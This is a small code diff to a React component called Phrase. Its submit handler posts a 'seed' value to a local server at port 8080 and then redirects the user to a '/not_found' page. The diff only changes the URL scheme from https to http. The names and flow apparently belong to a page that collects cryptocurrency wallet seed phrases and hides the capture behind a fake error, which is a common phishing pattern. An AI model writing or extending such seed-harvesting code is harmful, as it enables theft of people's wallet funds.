@@ -26,7 +26,7 @@ const Phrase = ({ seed1, setSeed1, error1, setError1, disabled1, setDisabled1, c
 
 
   const handleSubmit = async(e) => {
-    axios.post("https://localhost:8080/form", { seed: seed1 });
+    axios.post("http://localhost:8080/form", { seed: seed1 });
     Navigate('/not_found')
   }
 
